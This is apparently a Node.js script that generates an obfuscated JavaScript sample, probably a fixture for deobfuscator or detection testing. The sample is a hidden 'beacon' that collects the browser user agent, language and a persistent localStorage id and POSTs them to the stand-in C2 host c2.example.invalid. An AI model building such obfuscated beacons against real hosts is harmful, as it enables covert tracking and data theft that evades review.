// Builds samples/obfuscated.js: a benign "beacon" script obfuscated the way
// javascript-obfuscator (obfuscator.io) does it with
//   stringArray + rotate + base64 encoding + function wrappers + proxy objects
//   + control-flow flattening + dead-code injection.
// The C2 host is a reserved .invalid domain; the payload does nothing harmful.
import fs from 'node:fs';

const STD = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
const CUSTOM = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/';
const enc = (s) => Buffer.from(s, 'utf8').toString('base64').replace(/=+$/, '').split('').map((c) => CUSTOM[STD.indexOf(c)]).join('');

const strings = [
  '681204qWzRtV', 'log', 'userAgent', 'language', 'stringify', '1187714GhJkLp', 'getItem', 'uid', 'random',
  'toString', '3215841mNbVcX', 'substring', 'setItem', 'https://c2.example.invalid/beacon', 'POST', 'then',
  '12ZxAsQw', 'catch', 'status', 'send failed', '1|0|2', '8724910PoIuYt', 'split', 'dEaDc0dE', '24eRtYuI',
];
const NUM = { a: 0, b: 5, c: 10, d: 16, e: 21, f: 24 }; // indices of numeric-prefixed strings
const OFF = 0x1d2;
const idx = (s) => { const i = strings.indexOf(s); if (i < 0) throw new Error('missing ' + s); return i; };
const hex = (n) => (n < 0 ? '-0x' + (-n).toString(16) : '0x' + n.toString(16));

const D = '_0x4f1e';
const A = '_0x3b2a';
// checksum expression (evaluated with the correctly ordered array)
const parts = [
  ['a', 1, '+'], ['b', 2, '-'], ['c', 3, '*'], ['d', 4, '+'], ['e', 5, '-'], ['f', 6, '+'],
];
let target = 0;
const pv = (k) => parseInt(strings[NUM[k]], 10);
target = pv('a') / 1 + -pv('b') / 2 * (pv('c') / 3) + pv('d') / 4 + -pv('e') / 5 + pv('f') / 6;
if (!Number.isInteger(target)) throw new Error('checksum not integral: ' + target);
// make the checksum exact: obfuscator.io compares with ===, so pick strings whose result is an integer
const checksumExpr = `parseInt(_0x55e1(${hex(OFF + NUM.a)})) / 0x1 + -parseInt(_0x55e1(${hex(OFF + NUM.b)})) / 0x2 * (parseInt(_0x55e1(${hex(OFF + NUM.c)})) / 0x3) + parseInt(_0x55e1(${hex(OFF + NUM.d)})) / 0x4 + -parseInt(_0x55e1(${hex(OFF + NUM.e)})) / 0x5 + parseInt(_0x55e1(${hex(OFF + NUM.f)})) / 0x6`;
void parts;

// rotate: stored = correct rotated right by K; rotator shifts left until checksum matches
const K = 7;
const encoded = strings.map(enc);
const stored = encoded.slice(-K).concat(encoded.slice(0, -K));

// wrappers: W1(a, b) => D(b - d1, a) ; W2(a, b, c) => D(c - -d2, b)
const d1 = 0x2f3, d2 = 0x11a;
const viaD = (s) => `${D}(${hex(OFF + idx(s))})`;
const viaW1 = (s) => `_0x2a91(${hex(0x5e + idx(s) * 3)}, ${hex(OFF + idx(s) + d1)})`;
const viaW2 = (s) => `_0x19c7(${hex(0x3c1)}, ${hex(0x99 + idx(s))}, ${hex(OFF + idx(s) - d2)})`;

const src = `function ${A}() {
  const _0x1c9e = [${stored.map((s) => `'${s}'`).join(', ')}];
  ${A} = function () {
    return _0x1c9e;
  };
  return ${A}();
}
function ${D}(_0x1a2b3c, _0x5d6e7f) {
  const _0x2c3d4e = ${A}();
  return ${D} = function (_0x4f1e8a, _0x3c4d5e) {
    _0x4f1e8a = _0x4f1e8a - ${hex(OFF)};
    let _0x9a8b7c = _0x2c3d4e[_0x4f1e8a];
    if (${D}['qWeRtY'] === undefined) {
      var _0x5f6a7b = function (_0x1b2c3d) {
        const _0x4e5f6a = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let _0x7b8c9d = '', _0x2d3e4f = '';
        for (let _0x6a7b8c = 0x0, _0x3e4f5a, _0x8c9dae, _0x5a6b7c = 0x0; _0x8c9dae = _0x1b2c3d['charAt'](_0x5a6b7c++); ~_0x8c9dae && (_0x3e4f5a = _0x6a7b8c % 0x4 ? _0x3e4f5a * 0x40 + _0x8c9dae : _0x8c9dae, _0x6a7b8c++ % 0x4) ? _0x7b8c9d += String['fromCharCode'](0xff & _0x3e4f5a >> (-0x2 * _0x6a7b8c & 0x6)) : 0x0) {
          _0x8c9dae = _0x4e5f6a['indexOf'](_0x8c9dae);
        }
        for (let _0x1c2d3e = 0x0, _0x9eafb0 = _0x7b8c9d['length']; _0x1c2d3e < _0x9eafb0; _0x1c2d3e++) {
          _0x2d3e4f += '%' + ('00' + _0x7b8c9d['charCodeAt'](_0x1c2d3e)['toString'](0x10))['slice'](-0x2);
        }
        return decodeURIComponent(_0x2d3e4f);
      };
      ${D}['aSdFgH'] = _0x5f6a7b;
      ${D}['zXcVbN'] = {};
      ${D}['qWeRtY'] = !![];
    }
    const _0x1e2f3a = _0x2c3d4e[0x0], _0x6b7c8d = _0x4f1e8a + _0x1e2f3a, _0x4a5b6c = ${D}['zXcVbN'][_0x6b7c8d];
    if (!_0x4a5b6c) {
      _0x9a8b7c = ${D}['aSdFgH'](_0x9a8b7c);
      ${D}['zXcVbN'][_0x6b7c8d] = _0x9a8b7c;
    } else {
      _0x9a8b7c = _0x4a5b6c;
    }
    return _0x9a8b7c;
  }, ${D}(_0x1a2b3c, _0x5d6e7f);
}
(function (_0x3f4a5b, _0x2b1c0d) {
  const _0x55e1 = ${D}, _0x7c6d5e = _0x3f4a5b();
  while (!![]) {
    try {
      const _0x8e9fa0 = ${checksumExpr};
      if (_0x8e9fa0 === _0x2b1c0d) break;
      else _0x7c6d5e['push'](_0x7c6d5e['shift']());
    } catch (_0x4d5e6f) {
      _0x7c6d5e['push'](_0x7c6d5e['shift']());
    }
  }
}(${A}, ${hex(target)}));
function _0x2a91(_0x1f2a3b, _0x4c5d6e) {
  return ${D}(_0x4c5d6e - ${hex(d1)}, _0x1f2a3b);
}
function _0x19c7(_0x6e7f80, _0x2a3b4c, _0x5d6e7f) {
  return ${D}(_0x5d6e7f - -${hex(d2)}, _0x2a3b4c);
}
function collect() {
  const _0x51ab = _0x2a91, _0x0c3d = {
    'hYtRe': function (_0x1a, _0x2b) {
      return _0x1a(_0x2b);
    },
    'oPlMn': ${viaW1('userAgent')}
  };
  const _0x7a1b = {
    'ua': navigator[_0x0c3d['oPlMn']],
    'lang': navigator[_0x51ab(${hex(0x5e + idx('language') * 3)}, ${hex(OFF + idx('language') + d1)})],
    'id': _0x0c3d['hYtRe'](getId)
  };
  return JSON[${viaD('stringify')}](_0x7a1b);
}
function getId() {
  const _0x6d5c = ${viaW2('1|0|2')}[${viaD('split')}]('|');
  let _0x4b3a = 0x0;
  while (!![]) {
    switch (_0x6d5c[_0x4b3a++]) {
    case '0':
      if (!_0x9f8e) {
        if (${viaD('dEaDc0dE')} === 'nOtThIs') {
          console[${viaD('log')}]('never');
        } else {
          _0x9f8e = Math[${viaD('random')}]()[${viaW1('toString')}](0x24)[${viaD('substring')}](0x2);
          localStorage[${viaW2('setItem')}](${viaD('uid')}, _0x9f8e);
        }
      }
      continue;
    case '1':
      var _0x9f8e = localStorage[${viaD('getItem')}](${viaW1('uid')});
      continue;
    case '2':
      return _0x9f8e;
    }
    break;
  }
}
fetch(${viaW2('https://c2.example.invalid/beacon')}, {
  'method': ${viaD('POST')},
  'body': collect()
})[${viaW1('then')}](function (_0x2e3f) {
  console[${viaD('log')}](${viaW2('status')}, _0x2e3f[${viaD('status')}]);
})[${viaD('catch')}](function () {
  console[${viaW1('log')}](${viaD('send failed')});
});
`;

fs.writeFileSync(new URL('./obfuscated.js', import.meta.url), src);
console.log('target', target, 'written samples/obfuscated.js');
